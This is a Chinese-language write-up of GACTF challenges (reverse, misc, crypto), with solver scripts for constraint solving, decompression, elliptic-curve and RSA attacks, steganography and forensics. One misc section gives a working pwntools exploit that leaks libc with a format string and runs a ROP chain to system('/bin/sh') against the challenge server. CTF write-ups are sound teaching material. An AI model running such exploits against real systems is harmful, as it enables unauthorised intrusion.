### <a class="reference-link" name="Simulator"></a>Simulator

LC3<br>[http://highered.mheducation.com/sites/0072467509/student_view0/lc-3_simulator.html](http://highered.mheducation.com/sites/0072467509/student_view0/lc-3_simulator.html)

对每两个字节`(~flag[i] &amp; flag[i+1]) + (~flag[i+1] &amp; flag[i])`，相当于异或，然后对比加密的flag

```
from z3 import *

flag = [BitVec('flag`{``}`'.format(i), 8) for i in range(26)]
dic = ['flag`{``}`'.format(i) for i in range(26)]
enc = [0x11, 0x11, 0x09, 0x1c, 0x1d, 0x02, 0x0c, 0x3c, 0x2b, 0x01, 0x17, 0x3d, 0x33,
       0x00, 0x0d, 0x0c, 0x1e, 0x2c, 0x2c, 0x42, 0x6e, 0x6c, 0x50, 0x0f, 0x6c][::-1]
solver = Solver()
for i in range(25):
    solver.add((flag[i] ^ flag[i+1]) == enc[i])

print(solver.check())
s = solver.model()
ans = `{`i.name():int(str(s[i])) for i in s.decls()`}`
for i in dic:
    print(chr(ans[i]), end='')
```

### <a class="reference-link" name="PicCompress"></a>PicCompress

压缩算法在一开始在两个buf中填充了0x1000和0x2020…，然后读入0x12个字节，在表中记录每个字节出现的位置。<br>
hint又提到了是使用数据的重复信息来进行压缩，感觉是和lz类似的算法，所以往这个方向搜了一下，果然搜到一个非常相似的算法LZSS<br>
谷歌搜索`lz compression "0x20"`<br>[https://community.bistudio.com/wiki/Compressed_LZSS_File_Format](https://community.bistudio.com/wiki/Compressed_LZSS_File_Format)<br>
pip安装lzss库 lzss.decompress（）即可

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://md.vidar.club/uploads/upload_ec5910700d5e27587aafb0ad1efcab6c.png)

`GACTF`{`Data_Compression_LZSS`}``

### <a class="reference-link" name="InfaintRe"></a>InfaintRe

gmp 库

000402F50 __gmpz_init_set_str proc

前面是 ECC

有个`2*64` 的矩阵, 第一行存 `x` 值, 第二行存 `y` 值, 提前算了个表<br>
每一列 $i, i \in [0, 63]$, 代表 $2^i g$

```
p = 20619522630365746025487407
A = 1
B = 0
E = EllipticCurve(GF(p), [A, B])
G = E(2426060508202830279419664, 5517895499364845267563628)
```

然后 `v42` 是 `flag` 前半段 16 进制表示的数, 以下记作 `m`<br>
下面的循环就是查表快速计算 `m * g`

注意到 ECC supersingular, 尝试 MOV

```
P = E(0x47d881b4d15078dd1fb5f, 0xf14fdbe413b467cf64d8f)

n = G.order()

canwemove = False
for k in range(1,10):
    if (p^k - 1) % n == 0:
        canwemove = True
        break
assert canwemove

Fp2.&lt;z&gt; = GF(p^k)
Ex = E.change_ring(Fp2)
G2 = Ex(G)
P2 = Ex(P)

while True:
    Q = Ex.random_element()
    Q = Q.order()//n * Q
    if Q.order() == n and G2.weil_pairing(Q, n) != 1:
        break

g = G2.weil_pairing(Q, n)
h = P2.weil_pairing(Q, n)

key = discrete_log(h, g)
print(key)
# 2580186748
m1 = "%08x" % key
```

找到代码 [https://github.com/piotrpsz/3-Way](https://github.com/piotrpsz/3-Way)

不管了直接蒙

```
func main() `{`
    var keys [][3]uint32
    keys = append(keys, [3]uint32`{`0xDEADBEEF, 0x7865ADDB, 0xDDBBCCDD`}`)
    keys = append(keys, [3]uint32`{`0xDEADBEEF, 0xDDBBCCDD, 0x7865ADDB`}`)
    keys = append(keys, [3]uint32`{`0x7865ADDB, 0xDEADBEEF, 0xDDBBCCDD`}`)
    keys = append(keys, [3]uint32`{`0x7865ADDB, 0xDDBBCCDD, 0xDEADBEEF`}`)
    keys = append(keys, [3]uint32`{`0xDDBBCCDD, 0xDEADBEEF, 0x7865ADDB`}`)
    keys = append(keys, [3]uint32`{`0xDDBBCCDD, 0x7865ADDB, 0xDEADBEEF`}`)

    var lock [][3]uint32
    lock = append(lock, [3]uint32`{`0x99080122, 0x5E531F7C, 0xC938E326`}`)
    lock = append(lock, [3]uint32`{`0x99080122, 0xC938E326, 0x5E531F7C`}`)
    lock = append(lock, [3]uint32`{`0x5E531F7C, 0x99080122, 0xC938E326`}`)
    lock = append(lock, [3]uint32`{`0x5E531F7C, 0xC938E326, 0x99080122`}`)
    lock = append(lock, [3]uint32`{`0xC938E326, 0x5E531F7C, 0x99080122`}`)
    lock = append(lock, [3]uint32`{`0xC938E326, 0x99080122, 0x5E531F7C`}`)

    for _, i := range keys `{`
        for _, j := range lock `{`
            a := New()
            a.KeyGenerator(i[0], i[1], i[2])
            fmt.Println(a.DecryptBlock(j[0], j[1], j[2]))
        `}`
    `}`

`}`
```

```
aaa=[1442713590,2130004547,999378177,
3715074060,1546787771,3558000529,
2345384364,2299297806,3238312316,
3365860302,461279304,3351913643 ,
2725018931,3108148028,1147999796,
1431036900,3492617561,3694897028,
2934140994,196907226,1601805785 ,
3783615533,1655002665,878970657 ,
1886204275,1734292273,557018420 ,
457552177,2404218334,1199786752 ,
406184146,3808925520,1336810170 ,
839430152,2123013415,424255286  ,
4036825946,2888350436,3322165461,
4156782469,3121613667,3667664087,
2766723236,4161188298,112046206 ,
4151719228,1559219438,2165710851,
806467114,1493285482,3980984443 ,
1085510952,4107915488,1713974494,
3397459558,1303330289,3491089158,
315442165,3558561645,3739644906 ,
73894280,1978443525,862152849   ,
2192208299,4142575881,2913343521,
504577912,3280750632,3710214969 ,
3377539561,1658640875,2833981957,
3340622804,3173832998,2858759365,
1161448396,3481174438,2208164925,
3164732056,2704687535,259971279 ,
292919418,3352191686,1279017128 ,
661599991,3675899740,567668472  ,
1426051838,861479440,3791123737 ,
4014046098,2836797726,1955280701,
1049051955,1259179151,3260675104,
1407116118,2750841466,1220437523,
904600725,1069019603,1909258652 ,
457203902,2759562021,283053687  ,
1511477758,1573477500,2804228528]

for i in aaa:
    aaastr=''
    while i!=0:
        aaastr+=chr(i&amp;0xff)
        i=i&gt;&gt;8
    print(aaastr)
```



## misc

### <a class="reference-link" name="GACTF%20FeedBack"></a>GACTF FeedBack

问卷调查

### <a class="reference-link" name="signin"></a>signin

拼图

### <a class="reference-link" name="v%20for%20Vendetta"></a>v for Vendetta

> <p>v is the hero in my mind<br>
hint1:注意每一帧图片的不同之处(Pay attention to the difference in each frame)<br>
hint2:尝试找出藏在GIF图片内的二维码(Try to find the QR code hidden in the GIF picture)</p>

打开压缩包，提示密码是6位数字，爆破出压缩包密码:123233<br>
解出文件`v`前部分开头有`89a`，猜测是GIF，需要在文件开头加上”GIF”<br>
后部分是zip

[![](https://p0.ssl.qhimg.com/t01e65b195c8fd75b51.png)](https://p0.ssl.qhimg.com/t01e65b195c8fd75b51.png)

`pwn` `libc-2.27.so` `ld-2.27.so`<br>
应该需要pwn<br>
仔细观察GIF，有个黑点在图像右上方移动<br>
起点大概在(550,50)终点大概在(640,140)，使用脚本把他的移动路径画出来

```
import os
from PIL import Image, ImageSequence

min_x = 550
min_y = 50
max_x = 640
max_y = 140

gif = Image.open("v.gif")
gif_iter = ImageSequence.Iterator(gif)
frames = [frame.copy() for frame in gif_iter]
bar_code = Image.new("RGB", (90,90), (255,255,255))
black = (0,0,0)

def get_pixel(img: Image):
    for x in range(min_x,max_x):
        for y in range(min_y,max_y):
            pixel = img.getpixel((x,y))
            if pixel == 0:
                bar_code.putpixel((x-min_x,y-min_y), black)
                return(x-min_x,y-min_y)

for frame in frames:
    print(get_pixel(frame))
bar_code.save("v.png")
```

得到一张二维码

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01a91e499d81a95410.png)

扫码得

> <p>the password is V_f0r_VeNdettA_vk<br>
now,pwn me to get the flag.<br>
for China<br>
119.3.154.59 9999<br>
for foreign countries<br>
45.77.72.122 9999</p>

解开压缩包，导入ida发现无法识别，注意到文件名是倒着的，进行字节反转<br>
用guest用户的strlen+strcpy越界覆盖随机数，root登录后用格式化字符串leak lbase然后栈溢出rop

```
from pwn import*
import time
local=int(sys.argv[1])
ru = lambda x : cn.recvuntil(x)
sn = lambda x : cn.send(x)
rl = lambda   : cn.recvline()
sl = lambda x : cn.sendline(x)
rv = lambda x : cn.recv(x)
sa = lambda a,b : cn.sendafter(a,b)
sla = lambda a,b : cn.sendlineafter(a,b)
ia = lambda   : cn.interactive()
ga = lambda a,b : gdb.attach(a,b)
sc = lambda a,x : success(a+':'+hex(x))
libc=ELF('./libc-2.27.so',checksec=False)
context.log_level='debug'

if local:
    cn=process('chroot . ./qemu-arm-static -g 1239 ./pwn',shell=True)
    sl('2')
    sla('username:','root')
    # raw_input()?
    sa(' password:','\x00'*16)
    sla('You can input token:','%15$p')
    sla('4:Logout','2')
    ru('0x')
    lbase=int('0x'+rv(8),16)-0xff71a4df+0xff6cb000
    success('lbase:'+hex(lbase))
    ia()
    binsh=lbase+876332
    sleep(1)
    sl('3')
    sleep(1)
    sl('3')
    sleep(0.5)
    sl(p32(lbase+0x5919c)*10+p32(binsh)+p32(0)+p32(lbase+libc.sym['system']))
    ia()
else:
    cn=remote('119.3.154.59',9999)
    sl('1')
    sleep(0.1)
    sn('a'*0x10)
    sn('a'*0x10)
    sl('2')
    sa('username:','a'*0x10)
    # raw_input()?
    sa(' password:','a'*16)
    sl('2')
    sleep(0.1)
    sn('a'*0x10)
    sleep(0.1)
    sl('4')
    sl('2')
    sla('username:','root')
    # raw_input()?
    sa(' password:','a'*16)
    # ia()

    # sl('2')
    # sla('username:','root')
    # # raw_input()?
    # sa(' password:','\x00'*16)
    sla('You can input token:','%15$p')
    sla('4:Logout','2')
    ru('0x')
    lbase=int('0x'+rv(8),16)-0xff71a4df+0xff6cb000
    success('lbase:'+hex(lbase))
    binsh=lbase+876332
    sleep(1)
    sl('3')
    sleep(1)
    sl('3')
    sleep(0.5)
    sl(p32(lbase+0x5919c)*10+p32(binsh)+p32(0)+p32(lbase+libc.sym['system']))
    cn.interactive()
```

### <a class="reference-link" name="RIG"></a>RIG

> RIG是一个小有名气的黑客，圈内人都叫他exploit kid。RIG最近开发出了一套攻击工具包，利用浏览器漏洞在网络上兴风作浪。作为一个安全工程师的你，需要从捕获到的报文中找到RIG的攻击流量，从攻击流量中找到RIG使用的shellcode，提交shellcode的前13个字节的大写hex数据作为flag,温馨提示,请勿轻易运行哦:)

9795包处有一个巨大的HTTP响应包<br>
其中包含恶意js代码，<br>
用ie调试，点击console的错误信息，得到被解密的一层js代码，其中有一段base64，解密得到vb脚本，其中`getegeheteegegegege()`函数疑似获取shellcode

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01411c5e6ec73aa1e0.png)

`str`变量即为hex过的shellcode，获得flag

### <a class="reference-link" name="crymisc"></a>crymisc

> 8.25 is Chinese Valentine’s Day.Yesterday my brother told me he was refused by a beautiful girl.He was sooooooooooooo sad and bursted into tears.

下下来的文件是zip，有伪加密，改了就ok<br>
解出一个txt和一个jpg，jpg末尾跟着的字符串是base64

[![](https://p4.ssl.qhimg.com/t013802d08d748e2b73.png)](https://p4.ssl.qhimg.com/t013802d08d748e2b73.png)

[![](https://p3.ssl.qhimg.com/t01eb0da4d325b32df9.png)](https://p3.ssl.qhimg.com/t01eb0da4d325b32df9.png)

然后还有个zip，需要肉眼识别然后改个`50 4B`文件头<br>
解压得到另一个txt

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01b8146a732cf8e510.png)

```
🔭💙🐰✊🌻🐧💙😘🌻🍶💐🍌🏊🍩🚁🏊👹🐶😀🐶😀😘👹💙🍂💇😀😀😩🌻🍟👂🍶💐🍌🏊🍩👆🏠🙇🍂🍂👼😱🚔🐶👉✊😱🏠🙇🍂🍂👼😱🚊😧💨💙💕
```

codemoji的cracker<br>[https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17](https://github.com/pavelvodrazka/ctf-writeups/tree/master/hackyeaster2018/challenges/egg17)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01b9cbb92f472dd79e.png)

`WelcometoGACTF!ThisisthepasswordGACTF`{`H4ppy_Mi5c_H4ppy_L1fe`}``

### <a class="reference-link" name="capture"></a>capture

```
截获到的虚拟世界到现实世界的消息

message captured from virtual world to real world
```

DM/PL protocol<br>
脚本有点小问题，单纯一行U或D读不出来，就把对应的换成前一行的坐标就行了。

```
import turtle
f=open(r'P:\Downloads\captured.txt','r')

for i in range(17):
    f.readline()

turtle.screensize(800000,600000, "green")

# turtle.setup(width=0.6,height=0.6)

# turtle.pendown()

# turtle.goto(3,39)

# turtle.goto(300,239)

# turtle.penup()

turtle.speed(10)
# for i in range(500):
        # f.readline()
        # f.readline()
        # f.readline()
        # f.readline()
        # f.readline()
# try:
if(1):

    while(1):
        cur=f.readline()[46:].split("\r\n")[0][2:-1]
        if(len(cur)&lt;1):
            print(cur,f.read(100))
            input()
            break
        if(cur[0]==','):
            x=cur.split(",")[1]
            y=cur.split(",")[2]
            x=int(x)
            y=int(y)

            turtle.goto(x,y)

        elif(cur[0]=='U'):
            cur=cur[1:]
            if(len(cur)&lt;1):
                continue
            print(cur)
            if(len(cur.split(","))&lt;2):
                continue
            x=cur.split(",")[0]
            y=cur.split(",")[1]

            x=int(x)
            y=int(y)
            turtle.goto(x,y)
            turtle.penup()
        elif(cur[0]=='D'):
            cur=cur[1:]
            if(len(cur.split(","))&lt;2):
                continue
            x=cur.split(",")[0]
            y=cur.split(",")[1]
            x=int(x)
            y=int(y)
            turtle.goto(x,y)
            turtle.pendown()

        f.readline()
        f.readline()
        f.readline()
        f.readline()
# except Exception as e:
    # print(e)
    # input()
```

gactf`{`33ffb710eaae052d8b2f7a3955b6517c`}`

### <a class="reference-link" name="oldmodem"></a>oldmodem

打开压缩包是wav<br>[http://www.softelectro.ru/bell202_en.html](http://www.softelectro.ru/bell202_en.html)

根据题目提示，bell 202 编码，寻找可以读取的软件<br>[http://www.whence.com/minimodem/](http://www.whence.com/minimodem/)

[![](https://p0.ssl.qhimg.com/t01c4d9467162ed09ab.png)](https://p0.ssl.qhimg.com/t01c4d9467162ed09ab.png)

运行 直接出flag

### <a class="reference-link" name="trihistory"></a>trihistory

docker pull impakho/trihistory:latest

下载镜像的同时去Docker Hub上查一查dockerfile

[https://hub.docker.com/layers/impakho/trihistory/latest/images/sha256-17297590f715c03d277b0587bedfd471b1cef1270903751c978e72dd0de570f5?context=explore](https://hub.docker.com/layers/impakho/trihistory/latest/images/sha256-17297590f715c03d277b0587bedfd471b1cef1270903751c978e72dd0de570f5?context=explore)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ec4c593ac33a65fe.png)

换了apt源，又装了个nginx，可能nginx的www里有东西

直接docker save，把各OSI层拽出来看看

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t013b61b8965709104b.png)

01da3848ca6779c0bd598f39d6f95207af92b91be77f97d3f5f21d7d0b202aae层里确实有/var/www/html/flag.html，但是只有个flag is removed

OSI层148ba1e1d9b5e9970fd2cab3ce9ca0c2d3343504d4af27603a0e1bb9543b13ba，发现root下有一histry文件夹，里面是用git做版本控制的目录

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t0114b3620bcd5de733.png)

所以查看一下git histroy，reset到47a5ffbd63f271bc627af973d7a949232cfb47c6

之后wwwroot下有.flag.html.swp，看一下Hex就行



## crypto

### <a class="reference-link" name="da%20Vinci%20after%20rsa"></a>da Vinci after rsa

```
pa = 9749
pb = 11237753507624591
pc = 9127680453986244150392840833873266696712898279308227257525736684312919750469261

mas = GF(pa)(c).nth_root(5, all=True)
mbs = GF(pb)(c).nth_root(5, all=True)
mcs = GF(pc)(c).nth_root(5, all=True)

ms = [] 
for ma, mb, mc in itertools.product(mas, mbs, mcs): 
    m = ZZ(crt(list(map(ZZ,[ma,mb,mc])), [pa,pb,pc]))
    assert power_mod(m, e, n) == c
    ms.append(m)
```

rsa 解出来 `flag`{`weadfa9987_adwd23123_454f`}``

[https://blog.csdn.net/weixin_43713800/article/details/105109195](https://blog.csdn.net/weixin_43713800/article/details/105109195)

```
key = [1,28657,2,1,3,17711,5,8,13,21,46368,75025,34,55,89,610,377,144,233,1597,2584,4181,6765,10946,987]
fb = [1,1,2,3,5,8,13,21,34,55,89,144,233,377,610,987,1597,2584,4181,6765,10946,17711,28657,46368,75025]

c = b'weadfa9987_adwd23123_454f'

t0 = list(map(fb.index, key))
t1 = t0[:]
t0[t0.index(0)] = 1
t1[t1.index(0, t1.index(0)+1)] = 1
assert set(t0) == set(t1) == set(range(25))

bytes([c[t0[i]] for i in range(25)])
bytes([c[t1[i]] for i in range(25)])
```

### <a class="reference-link" name="elgaml_rsa"></a>elgaml_rsa

看不出来咋分解 `secret`

`assert(len(flag)==36)` 有点突兀, 可能有用

验证了下 `secret` 确实是 `key.py` 里那个

代码很像 2018 Code Blue lagalem<br>[https://ctftime.org/writeup/10568](https://ctftime.org/writeup/10568)

md, yafu直接分解, 前面一大串 elgamal 是个啥子

```
factors = [(42044128297, 6), (653551912583, 15), (104280142799213, 6), (28079229001363, 14), (232087313537, 5), (802576647765917, 7)]
for prime, order in factors:
    assert isPrime(prime)
    assert n % (prime**order) == 0
    n //= prime**order
assert n == 1

res = []
for prime, order in factors:
    mod = prime**order
    phi = prime**order - prime**(order-1)
    g = gcd(e, phi)
    print(g, mod.bit_length())
    if g == 2:
        m2 = pow(c%mod, invert(e//g, phi), mod)
        res.append((m2, mod))

m2 = crt([res[0][0],res[1][0]], [res[0][1], res[1][1]])
m = ZZ(sqrt(m2))
print(bytes.fromhex(hex(m).strip('0x')))
```

### <a class="reference-link" name="what_r_the_noise"></a>what_r_the_noise

看起来正态分布

```
r = remote('124.71.145.165', 9999)


def f():
    r.sendlineafter(':', '2')
    data = r.recvline().decode().strip()
    return eval('[' + data + ']')


data = []
for _ in range(100):
    data.append(f())


rnd_data = [round(sum([data[i][j] for i in range(len(data))])/len(data)) for j in range(len(data[0]))]
print(bytes(rnd_data))
```

会有点偏差, 但全英文, 相邻的字母试试就出了

### <a class="reference-link" name="ezAES"></a>ezAES

爆个 key, 解个cbc就好了

```
import itertools
from Crypto.Util.strxor import strxor

def chunks(data, bs=16):
    return [data[i:i+bs] for i in range(0, len(data), bs)]

cipher = 'a8**************************b1a923**************************011147**************************6e094e**************************cdb1c7**********a32c412a3e7474e584cd72481dab9dd83141706925d92bdd39e4'.replace('*', '0')
cs = chunks(bytes.fromhex(cipher))

key0 = b'T0EyZaLRzQmNe2'

def decrypt_block(data):
    global key
    assert len(data) == 16
    aes = AES.new(key, AES.MODE_ECB)
    return aes.decrypt(data)

for a,b in itertools.product(range(256), repeat=2):
    key = key0 + bytes([a, b])
    h = hashlib.md5(key).hexdigest()
    SECRET = binascii.unhexlify(h)[:10]
    message = b'AES CBC Mode is commonly used in data encryption. What do you know about it?'+SECRET
    message = pad(message)
    ms = chunks(message)
    if strxor(decrypt_block(cs[-1]), ms[-1])[-8:] == cs[-2][-8:]:
        print(key)
        break

for i in reversed(range(1, len(cs))):
    print(i-1, i)
    cs[i-1] = strxor(decrypt_block(cs[i]), ms[i])

iv = strxor(decrypt_block(cs[0]), ms[0])
print('gactf`{`%s`}`' % iv.decode())
```

### <a class="reference-link" name="square"></a>square

转换成 pell equation `(4y+3)^2 - 48x^2 = 1`

```
def pellsD(d):
    continuedFraction = []
    ao = floor(numerical_approx(sqrt(d)))
    decimal = numerical_approx(sqrt(d)) - floor(numerical_approx(sqrt(d)))
    continuedFraction.append(ao)
    finished = False

    while finished == False:
        continuedFraction.append(floor(numerical_approx(Integer(1)/decimal)))
        if floor(numerical_approx(Integer(1)/decimal)) == Integer(2)*ao:
            finished = True
        else:
            decimal = Integer(1)/decimal - floor(Integer(1)/decimal)

    pList = [Integer(0),Integer(1)]
    qList = [Integer(1),Integer(0)]
    for i in continuedFraction:
        p = i*pList[-Integer(1)] + pList[-Integer(2)]
        pList.append(p)
        q = i*qList[-Integer(1)] + qList[-Integer(2)]
        qList.append(q)
    if (pList[-Integer(2)]**Integer(2)) - d*(qList[-Integer(2)]**Integer(2)) == -Integer(1):
        x = (pList[-Integer(2)]**Integer(2))+(qList[-Integer(2)]**Integer(2))*(d)
        y = Integer(2)*(pList[-Integer(2)])*(qList[-Integer(2)])
        return `{`'x': x, 'y': y`}`
    else:
        return `{`'x': pList[-Integer(2)], 'y': qList[-Integer(2)]`}`


data = []
res = list(pellsD(48).values())
k = res[0]
l = res[1]
lD = l * a
while len(data) &lt; 100:
    assert res[0]**2-48*res[1]**2 == 1
    res = [k*res[0]+lD*res[1], l*res[0]+k*res[1]]
    if res[0] % 4 == 3:
        y = int((res[0]-3)//4)
        x = int(res[1])
        data.append((x, y))
```

```
import re
import string
from hashlib import md5

from pwn import *

context.log_level = 'debug'


def connect():
    while True:
        try:
            r = remote('124.71.158.89', 8888)
            break
        except pwnlib.exception.PwnlibException:
            sleep(1)
    PoW = r.recvline().decode()
    suffix, target_hexdigest  = re.search(r'md5\(str\s\+\s(\w`{`4`}`)\)\[0:5\]\s==\s(\w`{`5`}`)', PoW).groups()
    proof = iters.mbruteforce(lambda x: md5( (x+suffix).encode() ).hexdigest()[:5]==target_hexdigest, '0123456789abcdef', length=5, method='upto')
    r.sendlineafter('Give me xxxxx: ', proof)
    return r

r = connect()

for x, y in data:
    r.sendlineafter('[&gt;] x: ', str(x))
    r.sendlineafter('[&gt;] y: ', str(y))

r.interactive()
```

### <a class="reference-link" name="babycrypto"></a>babycrypto

看起来像 diffie hellman over complex number

p 都不给咋整? 可能 mov?

m0leCon CTF 2020 Teaser — King Exchange

```
p = gcd(A[0]^2 + A[1]^2 - 1, B[0]^2 + B[1]^2 - 1)
p = factor(p)[-1][0]
assert is_prime(p)
F = GF(p)
R.&lt;w&gt; = PolynomialRing(F)
K.&lt;w&gt; = F.extension(w^2 + 1)

g_K = g[0] + g[1]*w
B_K = B[0] + B[1]*w
b = discrete_log(B_K, g_K)

print(b)
print(multiply(g, b) == B)
```
